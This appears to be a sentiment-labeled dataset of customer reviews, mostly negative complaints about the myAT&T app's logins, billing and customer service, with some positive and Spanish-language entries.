Perhaps the one star rating isn’t fair since I can’t actually review the new features.  The app won’t let me sign in.  It just freezes at the sign in page and you can’t even enter a password.  It’s just stuck.,negative

AT&T advertising sounds as though I should be able pay for my phone and my Direct TV both on MyAT&T. Following hours of working with app I am unable to locate Direct payment function. Paying my phone bill works fine. Note: I refuse to use auto pay for Direct TV. It would seem AT&T could do better.,negative
Service is slow and no help on how to unlock SIM card with pin,negative
Navigation is atrocious. When opening the app I’m confronted with ads and product placements. I had to tap to pay my bill then tap my account. I want my account to be the first thing I see which was the case some time ago. Also there are too many security verification steps. If my password was entered then Touch ID should just work every time no matter if cookies are cleared or not. It’s an app on my phone! It’s just plain tough to get to where you want to be. Why when I select usage data am I not shown detailed usage data but have to tap deeper into menus which themselves aren’t clear? Awful app but it’s still the most convenient avenue for paying my bill.,negative

I bought 4 phones over a year ago during the BOGO promo. I was told that I would receive a credit for 2 phones on my bill every month.

This app works but is annoying!! It constantly requires updates but the updates erase the log-in and password info. I don’t understand why it is so difficult to log-in! Other apps for banking or credit cards are simple and no hassle. This one is ridiculous! I feel like I’ve updated my log-in and password multiple times. Just keep my information! :-(,negative
It works occasionally and is totally not intuitive.,negative
Bad company always lie,negative
You sent me a text informing me you were  going to allow us to use data for a week and it would not count against our usage because we were in the area in Ohio hit by the tornados which was very nice of you. I watched my data that week and not only did it count toward our data the the next morning of the day after the free week ended I got a text saying you were added a charge to my bill for going over my data. This is unexceptionable and I will be calling someone about this. Thanks for nothing!!!,negative
Since my phone updated last week I haven’t been able to retrieve my information and the loading symbol continuously keeps going and nothing happens. I can’t even see my new bill since I made changes today,negative

This app is hard to navigate and confusing for those who have multiple account. It’s a nightmare!,negative
Overall the app is garbage. You can make payments but that’s pretty much the only thing that consistently works. Checking usage and call logs is a total hit or miss experience. When it does work rarely are all the calls and messages shown. It’s like it just picks and chooses which info to display. Close the application and immediately log back in and the usage is totally different. Very unreliable.,negative
Only thing worse than the app is the actual U-verse service.,negative
Why can’t I get into myAT&T app. Every time I tried to get in there is a blank screen?????,negative
I’ve updated the app and the OS am now it won’t let me sign in. Keeps saying check to make sure you are connected to a data plan. Really bad since I use this to track data usage and pay bill.,negative

The cable in my yard for over 3 weeks and still not buried was torn out of the house on a Saturday.  After 2 hours on the phone  and being told I can’t get a “service appointment” until I troubleshoot with them “ troubleshoot?  What reset my modem?  I’m standing in my yard holding the cable in my hand I said.  I ended up transferring 6 or 7 times and in the end I was told I can get a service tech for 4 days.   Soooo sorry I didn’t learn about their lame service a week earlier when I could have canceled all services penalty free.  Still upset a day later and debating whether or not paying the $185 to get rid of them might be worth it.  Think hard about their customer service and how you will be treated before going this route.,negative

"AT&T is the worst telecom company I’ve ever dealt with. I thought Verizon was bad because of the constant capacity issues. AT&T is worse, because they put NO or the least amount of money back into the services they offer. The “improvements” that have been made to the myAT&T app are: removal of chat in the Support area. It is only now visible in the upgrade screen (go figure). And removal of support options that allow customers to contact support by doing anything other than dialing 611 from your phone. I wish I’d never left Verizon. AT&T is a terrible company, and this app is further proof of that.",negative
I absolutely hate this app. Now that they’ve linked att with Directv I can never find one or the other bill to pay without calling them and getting help. It’s extremely annoying and a waste of time I don’t have. Thinking of changing providers at this point,negative

Not once was it mentioned when I called in over the past almost 2 months, now I call in and they say the systems are down. Worst customer service I’ve ever received, supervisors that don’t follow through.

Not to mention channels I pay for and no longer get, but nobody can explain why. Or have they ever offered any type of compensation for anything. Not att who try’s to take people’s money and screw them over.

Lot of difficulty since last month entering the passcode. For years no problem. Then major difficulty.?????,negative
I don’t know where to start. I tried to unlock my phone. I had to enter all the information that ATT already has. Surely the developers of this app have mobile phone of their own and thought of unlocking it at sone point.,negative

This company lies through their teeth! I canceled my bundle package and paid them their cancellation fee of 300$ and my bill was still the same price for the bundled package so not only did I pay them the 300$ but I’m still paying the same prices bill with or with cable connected and bundled with the internet! What a complete scam! Like this company’s service representatives couldn’t even tell me the truth about how it would turn out! This company makes so much money and they just had to trick me for an extra 300$ and I’m still paying the same amount and still finishing the full contract so I hope this company is happy with their stole extra 300$,negative
My internet freezes and what ever I’m streaming I have to pause and restart,negative
I been having billing issues since I established service and it continues. I was told my bill was gonna be a certain price now it is a totally different price and that’s even after I made changes.

This app makes it very easy to pay the cell phone bill each month. The invoice is clear and it is flagged each month. Payment to the right credit card is fast.,positive
"I month ago I struggled to pay my bill because of AT&T insistence that they send a a texted number to a phone number I don’t have access to. Eventually, I found a way to pass the bill without logging in. Now that has been blocked. I spoke to their customer “support” people after sitting on hold at International rates for more than a half hour and the “service” rep hung up on me after they couldn’t solve the issue. As is the person barely spoke English. 

Clearly, AT&T couldn’t care less and us more interested in customers not calling customer care. 

If it was possible to give negative stars I would.",negative
When I open the app it will make me click on my account. When I click on my account I go to a white screen with a back arrow In the top left and a cancel option in the top right? Thats it. Making me unable to use the app. My auto pay didn’t go through due to my own fault to lack of funds and when I tried to use the app to send my payment through the same thing happened. White screen arrow and cancel option in the top and nothing happens. A small portion of the time this does not happen and it works which is good but still.,negative
I set up Touch ID to view my account so not to have to remember a password. More often then not the screen appears for you to enter the password. What happened to Touch ID?? Very irritating.,negative

I’ve reset user ID and password multiple times and it still won’t open,negative
For the last month every time I go to sign in I get message code 202 telling me I need to re-enter my password because it says it has either changed or I haven’t been on the app in a while. Which is hard to do since every month I pay my bill through it and check on usage a few times a month. Big tech company like you and you can’t get an app straight? I’m also tired of getting text messages and emails every time I pay a bill...I know I’m paying it I don’t need noisy reminders.,negative
May 5th I ordered 2 Samsung galaxy s10e! I was told by a representative that buy 1 get 1 free promotion! The information on my bill was going to be 105.00 with tax if I paid off my 2year iPhone which was balance of 178.55 paying it off would make me eligible for this promotion! New Samsung was going to be 25.00 a month added to my plan for 24 months! My phones would be sent to me by May 7 I gave 105.00 for tax and assumed that would be the consummation of our contract! Well by May 9 no phones!!! I called 611 to find out where my order was? Representative said no such name (representative) no order ever placed) sorry?  I don’t like liars. I said I have a email confirming this order plus I had 3 guests at my home when I had this conversation and my phone was on speaker! And in my email is the order number! Speechless he asked if I could hold!  When he returned he informed me that he was trying to reach me and my email wasn’t working so he sent phones back! Another lie! I will not continue with the rest of my horrific story as it goes on until it finally ended yesterday June 7 one month ! Every person I spoke to was so different from the last lie after lie! My total time on my phone talking with managers complaint departments and many more lies!! Totaled 9 hours! I have been a perfect customer for years and I was treated like a moron! I owned my own business for 25 years and if I ever treated any of my customers in this fashion I would have been out of business within a year!! My advice to the top manager who finally after 70 minutes negotiated a price that I could live with not the original contract! I suggested a seminar for all personal training or otherwise on either knowing every detail concerning promotions and upgrades and devoting lots of time on the practice of lying to customers! In the month of this insanity I figured maybe 25 to 30 lies I was told!!! Not except able for anyone to operate their business in this fashion!! Very unhappy customer!! The only truthful person was a gentleman I met in Vero Florida (ex marine) who is going to program my phones on Monday at AT&T Thank God for his service and his code of honor!!! Maybe he should head up the seminar I suggested!! Please change your policy!,negative

"AT&T’s app only allows you to view and pay your bill. To make changes, you must call and wait in queue for entirely too long. A company as old and well founded as AT&T should hold the market on good customer service yet instead they have outsourced this most critical element. They think they are so big that they don't even have to try to be decent to their customers.",negative

"I was told even by a few ATT employees not to change my “unlimited” family data plan I was grandfathered into because I signed up for this family plan in 2007, though an ATT cell phone customer since around 1991 in another state.
ATT called me about every week for a very long time and every time I refused, until one “nice” representative called and explained that my current unlimited bill would now continue to increase by $5.00 on a regular basis, where this new “unlimited data plan” wouldn’t go up like that. A few months in and no, it didn’t start going up by $5.00, it goes up $8.00, without any kind of “guarantee” I was clearly fooled by. I’ve used ATT since “nag phones”. It matters not. A company gets “too big to fail”? They’ll stick it to the “little people” without any values of ethics or transparency. My suggestion (that I’m taking myself) is search around for another more honest carrier. It’s a bit of trouble, but if not careful, a person like me will end up the fool thinking ATT tells the truth. They don’t.",negative
"Change your password and then you can’t even get into the app. Not good. But before the password was changed, the app was decent though could get confusing.",negative
It’s unacceptable that I can’t find a number to speak to someone from customer support about my bill. Everything is a link some automated instructions sometimes people want to speak to people.,negative
"This app has a lot of nice features. The problem is that they don’t work all the time, and the responsiveness is poor. It’s like working on dial up again!

The app is about as good as their customer service... poor",negative

I called last 3 times time and decreased the bill and this month I see they increase? Is your system crashed or human do the billing then computers?,negative
I keep having to change my password because it says my password is never correct... regular at&t BS,negative
App is not working properly since I updated it,negative
I can’t sign in after apple iOS upgrade,negative
"Can no longer log in.  The only option it gives is to delete my user ID.  
I’m feeling better about selling my T stock.  They appear to be falling behind.",negative
Do not like the updated payment options. It does not give you the option to pay a specific amount.,negative
For what I pay for this service one would think I wouldn’t get stuck in a login loop with the app.,negative
Una muy buena app,positive
This app fits AT&T’s horrible customer service to a “T”.   Absolutely worthless,negative
"Very very very very annoying. I cannot log on while on the Netherlands. Either on the app or computer. Have two phones, called support, they say wait until I get home. I simply do not understand the logic.",negative
"It’s not user friendly and shows me nothing I want to see. 
Do better.",negative
"This month I received my monthly bill a week earlier with 50% higher than my regular payment. After checking the details, I found out that A&AT made errors, they added a new line on my phone without my knowledge and changed me the new line! I called A&AT customer services, the person said I was the one added this number! No apologies whatsoever, she let me waiting 58 minutes without any answer just playing a background music, finally I gave up on endless waiting. 
I disappointed with their service, they have never called me back to admit their mistake and apologize how this error inconvenienced me. No explanation whatsoever, but just simply sent me a correct monthly bill! What experience I had!",negative
"App used to set a reminder when bill was coming due... that was very helpful, I cannot seem to get it to do that anymore... ??",negative
The only screen that will load is the new home screen and the account overview that shows me billing info that isn’t consistent with what I see when I log in to my account on the mobile website. I’m also unable to pay my bill through the app because it loads a blank screen (which is why I log in on the website).,negative
"Horrible. This app used to be efficient and trustworthy. Now, even though I have Face ID and Save Password enabled, it keeps asking me for my password (claiming it “may have changed”), even though it hasn’t changed in over a year! This latest session, it asked me for my password three minutes after it last asked me, and I hadn’t left the app at all! Please fix the login issue, and bring back the version that took you straight to your account and usage info, without the faux web site page in between.",negative
I tap on my account ID & nothing happens. Every other thing I tap on leads to something.,negative
Had my bill corrected 3 times and each month it’s a different bill!  Was promised my next six billing cycles would be the same and my very next bill was $40 more.,negative
"Raise my bill a buck or two every month. That's ""you're thing"", huh? Direct was fine before, but like everything else that AT&T touches, it turns to crap. Guess you're trying to pay off the tab from buying direct tv, so make your long term customers pay for it. This will be the last bill I pay to you crooks. Called dish network a couple weeks ago and they will be coming to install soon. They gave me a deal and you refuse to lower my bill (I've called and gave you a chance. You blew it. Not ""eligible"" for a bill reduction was your quick answer, even though ive been a direct customer for 10 years. You clearly do not care about long term loyal customers, so I don't care about you. Screw you AT&T. You're loss! I'll be placing this all over social media",negative
Most of the time the app doesn’t work!,negative
"I’m really considering changing carriers due to the poor reception in my area Goodyear Arizona. I’ve called multiple times with these issues and I get the same answers like you are in the process of repairing a tower which I was told when I moved to Indiana two years later relocated back to Arizona and I got the same answer. I enjoyed AT&T because of the price but with the poor service I may have to consider going to Verizon for better service. I don’t know what you guys can say or tell me that will give me confidence that my reception in this area can be improved. Near the area in my job I’ve dropped calls frequently it’s like a black hole in his in an area where I have business. I been a loyal customer with AT&T but as soon as I paid for it off I will strongly consider leaving AT&T. I guess from time to time going from one area to another is due to the carriers ability to maintain good signals and good service that will make a customer want to stay with them so I have to say good luck and hope to hear from you, But if not you were here for me.",negative
"This app is very hard to find info on your account.  I have used it to pay my bills prior, but with difficulty due to the fact that I have two (2) accounts that I pay.
 Recently(5/5/19) we upgraded to two Galaxy Note 9s.  Since then my account appears to be a total mess.  It appears that I still being charged for a number that I no longer have.  Also, I Amy having a extremely hard time canceling my 4G LTE wearable that was tied to my old phone.
The report that I accidentally found on the app, I no longer can find.  I have never really liked your app.",negative
Click on my account ID and nothing happens. Useless app at this point.,negative
"App works terribly, always saying “hmm, somethings wrong” and never lets me actually see or update my plan. Always have to use my computer. You’re better off switching off this carrier as soon as you can.",negative
"App is awful! Anytime I need to log in, it fails.",negative
The app is a lot more difficult to use. I’m not sure why they changed it. Hope the switch it back.,negative
Ever since Merging with Direct TV the app and customer service have been horrible.,negative
Your cellular service and customer service are by far the best. I’ve been a long term customer and have had nothing but good experiences. I’ve spoken to very professional people when ever I had any type of problem which were minimal. Thank you At&t for everything.,positive
Good company.,positive
"Constantly getting error messages that say, oops something went wrong. I can’t log in so I’m going to delete this app",negative
Idk why everyone else is rating this bad I haven’t had any bad experiences with the app yet 5 stars from me,positive
"The most horrible app, I ever used. Most of the time Server is responding with some cryptic errors- even the web page. If it would be possible to draw stars from other reviewers away, I would take at least 10....",negative
This is just another way AT&T can cut down on their customer service budget and ignore their customers.,negative
"Now for the past few months, there’s a problem EVERY TIME I try to log in!!  It’s annoying enough to go to another company. Paying my bill used to take a minute, now it takes ten!!  Fix your stuff ATT.",negative
Have not been able to log in since we switch,negative
Just hate att altogether. It’s become a monopoly,negative
It brings me no pleasure in saying I am done with AT&T as a whole. I have four cell phone accounts on a G-Father plan. I have a business acct. for my office. I also have a home phone Internet and television Fiber U-verse with this company. They have now canceled my appointment twice. And would like hundreds of dollars upfront just to put in a new order for an issue they caused. So the fact that they had messed up  and canceled my services to get new service they would have to run my credit and apply for a new work order. And appointment. Well I don’t have that great of credit lately. But I’ve been with this company at this exact unit for a year now. But because of their fault they can’t come out to the house for an additional week. No internet no tv. And yes they want more $. I am done & please do yourself a favor and don’t allow this company to hurt your family anymore like they have hurt mine with no remorse other then a salesperson in a state across the us wanting your debit card.,negative
Always happy and when I have a problem they assist me rapidly and my service is great,positive
My app constantly freezes and the only task I can accomplish on the app without it freezing is to pay my bill...,negative
"Service, CUSTOMER SERVICE, Price and the way you doubled my bill after one year....what a bunch of jackasses ?? I WILL 1,000% be getting rid of DirectTV",negative
I have been experiencing very slow data in my area and when you drive for living you are lost without data and dropped calls,negative
It only works half the time. It don’t matter if on cellular data or my house WiFi.,negative
I do not like this new update its stupid and confusing!,negative
I have had Att for about a year and more often than not there is an issue with my bill every single month. At first my bill started out at $60 then jumped up to $400+. It not fluctuates from $50-$400 a month. You are not going to convince me that some months my data usage is so low that my bill is lower than it’s supposed to be and then the next month my data usage is so high it costs me more than my car payment! I started paying $30 a week to keep the bill down then get hit with $130 bill so I pay that off at once and not even 4 days later get a bill for $192!? Sadly no one else offers internet in my area and I need it for work.,negative
The old app was way better. I hate to constantly have to sign into the app. Always refreshing yet never gives me accurate info. Just made payment but doesnt even let me view which card it’s actually coming out of. They need to step up their game with this app. Not user friendly or convenient at all. I dont care to view ads or marketing info as soon as i open my app.,negative
Adrianna helped transfer service for me easily. She was professional and friendly. Thank you!!!,positive
"I have been with At&T for quite ( years ) sometime and it baffles me that the representative who I speak with tries to sell me a dream that even they themselves aren’t privy to have yet they will lie to me and sell me something that’s not on the market. I had been sending $60.00 and some change on my cable with all of the prime channels including the sports package. All of a sudden it went up double that until $123.00 a month. I also was paying $30.00 for 10gbps. Which of course allowed me to buffer, buffer and buffer some more. At&T was such a great service to me up until they lied to me...",negative
Your sales rep that showed up at my home encouraging me to set up mobile at service with att from sprint flat out lied. He said it would cost me 1400 from sprint to change over service .... turns out it cost 2100. Shame on me for trusting without verifying. Shame on ATT for being so unethical.,negative
"This app is a joke, it works about 5% of the time.",negative
Widget didn’t work,negative
App needs to open right into usage with a billing link in sight. You keep adding more navigation that’s annoying and often doesn’t load. I also use the Face ID and it keeps asking me for my password still.,negative
"You fixed it so well I can’t get to my phone bill.  
 
 Stop fixing it.",negative
Not updating like it should with data usage,negative
Your myatt website and app are a total mess.  App does not work.  Can’t log in.  Website is worse,negative
Good job,positive
"Enable Touch ID to access the app, but after that you have to enter your password anyway. So Touch ID is just to open the app. Typical attention to detail of our largest telecom. Ridiculous.",negative
Love att they are the best,positive
"I was asked to combine my Directv and cell phone on to the myAT&T app.  Well I thought I had it setup that I could see both of the accounts on the App. Well to my surprise when I tried to see my cell phone usage, I could not log onto my account.  I have jumped through hoops for days to try and get in and can’t. And just today I got a temporary passcode and now it tells me that the prepaid cell account can’t be combined.  Because I pay $40 instead of $100 per month this can’t be done.  Now that they messed me up combining the accounts, I can’t access my cell phone to see data usage.  AT&T get this straightened out.",negative
Only 3 because it doesn’t let you pick a date to pay online.  It forces you to do it “now” instead of when you want to schedule it.,negative
Thank you for correcting the mistakes others made outstanding service,positive
The prior AT&T app was difficult to navigate the latest version is even worse.  AT&T is over priced with minimal data options.  Looking forward to switching after nearly 12 years.,negative
"This app is AWFUL!!! The majority of the time when I want to check my data usage it isn’t available. If you change your password, don’t expect to get access to your info again. For a communications company this is a horrible example of the service.",negative
I’m am going to change this month,negative
Haven’t been able to log into my account with the app for months.,negative
I thought I had suspended my bill since I broke my phone and couldn’t afford a new one at the time. I was still billed for it once I was able to get a new phone plus late fees and reconnect fees. I’m looking for another carrier. Thank goodness for an unlocked phone so I can switch to a company that cares about their customers,negative
Trying to get user ID and password working together is impossible. Nothing seems to be intuitive. Very disappointed in ATT.,negative
This is the worst app I have ever used. You can’t sign in even though I have my passwords saved on my phone. Please fix this issue.,negative
"For multiple weeks on the app and online, repeated logins get this message:

I believe I’m done with AT&T 
They have not removed Direct TV
From my AT&T app!",negative
"For a communications company this APP is POORLY constructed. I attempt to log in to my account and although it prompts me to use ‘Touch’ and displays it, it does NOT work and there is NO provision for me to enter my password into a field, because there is no field. 
A waste of 45 minutes of my time. I’m just trying to pay the bill. Can’t you make it a more pleasant experience???",negative
This is one of the worse apps I have ever used and the most user unfriendly!!!,negative
Using this app helps me check my account daily I get to view my phone bill early and when I can’t make it to the store it’s easier to make online payments it also tells you when you’re eligible to upgrade your device and lets you order it on the app ..it’s a great app I recommend all AT&T customers use it,positive
"Title says it all. When it works it’s ok.  When it doesn’t, it really doesn’t.",negative
Difficult to get into the app,negative
Ever since they change the system it’s been horrible I have to keep entering in my password what’s the point of having Face ID if I have to keep entering in my password before it wasn’t like this and now they changed it and it’s difficult for me just to view my usage or my bill I hate it it’s horrible,negative
"As soon as I can get another service I will be changing. 
If I were AT&T I would be ashamed to put my name on such a weak product.",negative
I have to use the Lost My Password routine every month because 1 the website will not recognize my credentials from month to month and 2 the app does the same. I am forced to re-set my password monthly (with my existing password) to be able to pay my overly-inflated bill.,negative
"Appreciate the move to de-clutter, unintuitive to even find a previously-scheduled payment. Old notices stay active even after the notice no longer applies. 

2 stars is mean and punishes what is apparently positive effort, but more tweaking is needed. 3 stars for solid effort that didn’t outright “break” the app aside from some transitions that might be due to other factors.",negative
"Useless Reps!  They don’t listen. Tried to explain my frustration in not being able to access my wireless account in my AT&T crap app.; but he was not interested he just wanted to ask question after question about my account, in which the questions had nothing to do regarding my issue. 

I’ve been with AT&T for 13 years and have always been satisfied with their customer service, up until now that is. Ever since AT&T & Directv joined forces, it’s been a total nightmare for me. It’s only the issues I’m referring to, it’s the customer service, it’s horrible. 

I never take the time to write comments but I’m so frustrated with AT&T, I had to express myself. 
We’ve been together way too long AT&T, get it together.",negative
"Trying to log in for days, codes sent no luck round & round. Terrible just like my entire experience with AT&T",negative
It’s always slow regardless of how fast the internet is.,negative
"There were 2 different techs who came out when my internet and tv service was moved.

I would like both of these gentlemen to
Get high praise on the professional service they completed.
They were both very friendly and polite.
Very glad they came out!

The last person I spoke with on the phone was also very helpful, polite, professional

I normally don’t do reviews but these 3 
People need to be praised!",positive
"I’ve had AT&T for about 10 years and I’ve been satisfied with my service until now. For some strange reason, my service is terrible now, which I’ve been dealing with because I’m a loyal customer. BUT NOW, this app hasn’t worked for me for about a week and I’m not able to log into my account. Please fix this problem ASAP.It’s  absolutely ridiculous at this point. FIX THE APP so that customers can log in!!! The 2 step verification code won’t send to my phone number. What is going on?!?",negative
"I really don’t understand why people are rating ATT and not the app.  Yes companies have their issues, but we are talking about the APP.  With that said I found it very easy to do what I need done, ie. make payments, check my data etc.",positive
Tired of paying 190.00 a month for 2 lines! Overcharged each month! Changing providers!warrior woman,negative
"The app is impossible to use when you have new information. 
Here it is February 20 and the app still has the bill for January. 
Get your heads on straight.",negative
"This extra paid service is not as good as it should be. The data service is OK, dialing a local telephone is a mystery, the wireless phone connection (Vodaphone in this case) is feeble. I couldn’t log in to the AT&T app via cellular. And the promised free WiFi availability is zilch. And still I pay 120$ a month because it makes me feel secure....",negative
"I like the extension of the coverage and the clarity of the reception both audio and data. 
I wish the itemized bills would be much detailed and interactive.",positive
"I’ve had to start from scratch every time I sign in using the AT&T app. I am not able to pay my bill, nor make any setting adjustments to my account. Total waste of time",negative
We Have been with AT&T for three years we had a massive storm which took our electricity down for two days. We were the first on the street to call they did not come out ever two weeks go by they kept giving us the runaround and they kept trying to schedule the appointment when it was convenient for them and kept pushing us back losing our order long story short we had to go on vacation this is into the third week and they still didn’t fix it we canceled our service,negative
Stuck loading my bill. Can’t view for the past few months. Try to get help from chat takes way too long. Call and wait to talk to someone in India so they can give you the run around and can’t ever accomplish what I what. Trying as soon as possible to change carriers because of the lack of customer service and understanding. Helping a customer save a little bit of money is out of the question when it comes to a huge money making company. Stop frustrating customers and help them!,negative
Several times made payments in advance before the 1st of the month & get a confirmation number and payment doesn’t process.,negative
This is the most irritating app of all time. It works when it wants to work and is painfully  slow.,negative
"We have AT&T and Direct TV which of course are linked.  They want to just charge you whatever for the Direct TV services but you can not actually access your bill or charges online or through the app.  Always get the our system is updating excuse but we will take your payment over the phone.  Want to leave your credit card is we can just bill you each month.  No thank you as you have yet to bill me the same amount.  Worst app, worst service ever.",negative
"If you want an app to simply take up space on your device, you found it. After multiple hours on the phone with 3 different people, this app still refuses to let me log in properly. 

App is junk... 

Good luck fellow at&t customer",negative
Always- every single time- makes me log in with password. Horrible app.,negative
Terrible navigation screens. Just horrible to find anything,negative
This app cannot make up its mind if it is att or directv at login. My stored password is rejected for unknown reasons and I am unable to login. I don’t know if I should reset the att or directv password. Very frustrating.,negative
"Many times in different places  I have seen no bars and 4G network instead of LTE,",negative
"Not a fan of the new front page. It was confusing. It appears to be sales first and serve second instead of the other way around. Once you figure out that the old screen is behind the top line which is a link everything is as it was and easy to use. 
The way I look at it. If I have the myATT app it’s because I’m a customer already. So let me manage my accounts first and give me easy access to sales stuff after I’ve gone to the management page. Heck add banners for promotions in the page but send me there first since that’s what I got the app for.",negative
Soon as I can I’m dropping these greedy fools.,negative
This is an app for phone service and i would imagine it would actually work. I have such a hard time with this app. It’s constantly freezing or taking forever to load.,negative
"I hate this app since the last update. I used to get into it and navigate through it so easily. The update happened, and it always stops me at the sign in screen. Having many services(wireless, internet, and DirectTV) here, its so frustrating to not be able to even access my information. Internet is already terrible, but not being able to access account information could push me over the edge??",negative
"I think this is an excellent app, but I feel like it would be better if it updated balances to your total quicker. It takes about a day or so before it corrects your total on your home screen.",positive
Love the one stop and pay,positive
"Buggy, glitchy, and crappy. I get a white screen when I open the app.",negative
I want to know how to get a new cover over the cell because the one I purchased has a scratch on it? Please get back to me ASAP,negative
"Awful app like the bloated, service lacking company that runs it",negative
Probably quicker to sit on hold and speak with someone at AT&T if you have questions or need to make changes.,negative
They overcharging me for my data,negative
They don’t keep their promises,negative
The data showing up on my account is incorrect when I speak with the customer support,negative
"Pricing is too high.Looking at other carriers for better deal. Have been with AT&T wireless since around 1995 in Jefferson City. Always had excellent coverage & service & free upgrades. What happened to them???? Is AT&at trying to run off all their faithful customers. My son left AT&T 2 years ago because he got better deal with Sprint. He said cheaper price plus,free iPhone 8 for all on his account.

STOP RAISING MY BILL PAYMENTS!,negative
Just logged in to check my data usage.  It shows values from 16 days ago and won’t update.,negative
This is the worst app. It takes forever to open. Isn’t available when you want it etc etc.,negative
not impressed by the slowness of this app,negative
This is irritating so is your fluctuating bill. Man I can’t wait to get Xfinity they charge you more but the service and benefits of how you watch shows is excellent! I wouldn’t have it if you hadn’t redlined my apartment complex. Ihateatt,negative
Convenient for me & I can make changes if I have to.,positive
You guys are awesome ????,positive
I called twice in one week and was given two totally different things when I asked when my son and I’s contract would end. I am very disappointed as to why my bill keeps going higher and higher. I will definitely go to another carrier once this contract is done!,negative
"Installed, uninstalled, and reinstalled! 3 times!! A blank white screen every time after logging in. All I can see is the hamburger icon and managing my settings. Useless app, and useless app development team for not thoroughly debugging the app prior to launch.",negative
App is always slow and signing me out when I have it remembered and selected to keep me in,negative
Very informative and helpful!,positive
"This app is extremely slow, and constantly gives errors when retrieving account info. The only aspect of the app that works, is making a payment. Go figure!",negative
One of the worst company ever,negative
The worst system ever,negative
worse service possible can't wait to get out of the contract,negative
How can att send me a notice saying I’ve used 75% of my data but not fix the one tool that would help manage that. Always says “can’t get data usage info”. Seems like a dishonest intentional glitch to me.,negative
The app will not load and always said you need a new ID,negative
Fix your app. With your prices shouldn’t cost you more then pocket change.,negative
"The app looks good on the surface, but once set up with Face ID on my iPhone XS I use it and once closed, it has to be uninstalled, reinstalled, and set up again every time you use it. You open the app, your set up ID is there, you select it and nothing. You have an option to add other ID’s or delete the one you previously set up. Never does it go to Face ID to validate. It does nothing. You can go to options and there you find Face ID is enabled, but that is it. Select your saved ID and nothing. If you uninstall the app, put it back, register everything again, then you can use the app...until you close it. Then do it again. Frankly I tried to use the app to see what their direct TV had to offer, but have have little hope if their app is this buggy, I don’t want anymore from them. I paid my bill on the computer rather that reinstalling the app to open it. This late in the app game, ATT is way behind. We got Apple TV instead.",negative
"Over charge for my genie tv the bill should be $35.00 dollars a month Jun 15, 2019. Account # 294260418.",negative
"This app has issues loading after logging in, this is my source of bill payment and was late last month and charged a late fee due to your app not being able to load for me to pay while I was out of town. Been a att customer for 11 years and i have to pay a late fee because your app is terrible. I’ve heard sprint and Verizon have well working apps so i May have to find me and my whole family a new phone service company.",negative
"I guess I messed up somewhere but I cannot even get my userid sent to my email address, no email ever arrives. Now as I said no doubt I messed up somewhere along the way but these apps are supposed to be idiot proof. As it stands I can get nowhere and do nothing.

I know the solution, switch to Verizon (or whoever hehe)!",negative
"This isn’t a review that covers the whole range of options in the app- because I can’t ever get to them. I try every once in a while and find I can’t logon even with correct ID and password, then give up. Tried updating password and get a message saying it worked, now login again, and it fails, or says service unavailable right now. I’ve never had more difficulty than with ATT and DIRECTV apps.",negative
"Your app is crap - if it’s still June 4, 2019 @ 11:27 pm then the app should reflect that - not boost the date and no way to correct - I will not pay any late fees on this months payment - your app crap not mine!!",negative
Quite possibly the worst app to be ever created. The service is just terrible and customer help can’t speak English. I have had an account for many years but it’s time to move on. You have forgotten your loyal long term customers that made you the success that you have become.  It’s too bad you care so little. Remember the old saying; Be nice to the one’s you pass as they are the same you fall under at the bottom!!,negative
This app loads when it decides to load. I can not understand why it takes so long to log in or for app to register a selection.,negative
This app does not work well at all- why cannot att make a decent app?,negative
AT&T is the worst service ever. Can’t wait to get rid of them!!!!,negative
"I haven’t been able to use my app for basic tasks in so long it’s not funny. It never loads the main home page , just loads for forever, but I sure can sign out! Which is pretty much all I want to do with AT&T.

For being such a big technology company, you would think y’all could make an app that would work on an iPhone! It took me 4 months to write this before I decided I hated the app. Imagine how many more of us there are!",negative
The app doesn’t work and takes to long to load. Not happy with this update,negative
Internet is slowing down due to bandwidth and nobody can help if a sudden just slowing down and its hard wired.,negative
This new update is so confusing can’t find anything. It very confusing,negative
My bill went up almost 100.00 dollars and when I called in not one person could tell me why !!!!  That is not only unprofessional but seems to be also illegal. I definitely am following up on this issue through an outside source .,negative
This app stopped working over two weeks ago. Ever time I call about it I get someone that doesn’t have a clue what I’m talking about. I guess I need to learn another language so I can find out how much data I have left.,negative
Att is a rip off,negative
Signal is garbled and weak in western Pennsylvania. Looking for a better carrier.,negative
"Disgustado. Desde la venta en la tienda he tenido que hacer llamada tras llamada. Hubo que hacer varias correcciones. Abro la página de At&t y el funcionamiento es pésimo. No me pueden ayudar a resolver. Como no puedo obtener en el sistema los estados de cuenta, tampoco pueden enviarlo por un correo electrónico. Debe ser más eficiente el servicio.",negative
El servicio es pésimo,negative
"It would be nice to have this app to pay bills and change international travel settings etc...that’s what it is there for, correct? The app freezes on me every time I use it. Restart, reboot and maybe by the 4th try it is working. Disappointed. (iPhoneX)",negative

Every time I try to pay my bills both AT&T and Direct..... it takes way too long.  If you want people to go paperless..... make a system that works!!.  I go to the AT&T app and it redirects me to the Direct payment screen...... after 6 tries I finally get it to allow me to access my cell phone bill.   Bad system and bad customer service!!,negative
"I don’t understand how a company at this size that’s profitable could have such a inferior app to pay my bills. Payments won’t always go through, it’s very slow, on login you don’t always have the same homepage. The app alone is making me consider other alternatives.",negative
"App is lame. Info is not up to date. App doesn’t open 50% of time. When app opens it doesn’t help or direct you. Lots of redundant steps. Tech company with bad apps, internet service, overpriced and a tech support and call center overseas.",negative
Totally useless app for prepaid plans. Only redirects you to the web page and asks for your password even if you had it saved.,negative
"Super slow and hard
To find what I’m looking for",negative
Won’t load for me.,negative
"Absolutely the worse service I’ve had in years.  HBO GO and HBO NOW  apps hasn’t worked since I’ve had the service.  I try to watch anything on HBO on demand and it doesn’t work either, I get a message  “sorry! We have no programs at this time that match the filter you selected”  Im fed up with this service and seriously thinking about cancelling the service.",negative
"My service really is crappy. I am looking for another service, one that stays connected with more than one device connected to it. I increased my service thinking it would be better but its worse. I am very disappointed. And its more expensive than the other companies",negative
I can never log into this app. I ALWAYS get a error message that says I need internet connection and it doesn’t work. I have great internet connection but this app doesn’t seem to recognize it. I end up going to the AT&T site that lets me in immediately. This app is so frustrating. I’ve even deleted and reloaded thinking that may help. It doesn’t.,negative
The worst experience of my life as far as customer service and the worst coverage for Beaufort Co in the world! Save your $ and use someone Elsa!!!!!!!!,negative
I have no problems with my at&t service. I’m happy!  I’d advise anyone to use this company. Thank you for your service.,positive
It took me too long. Took several attempts.,negative
"Fix this app asap. Can’t make any payments. When I login with my password, I click to make a payment and asks for my fingerprint and then the app stays on the loading page forever and a day. Now I have to go on my laptop to make my payments. Making this app useless.",negative
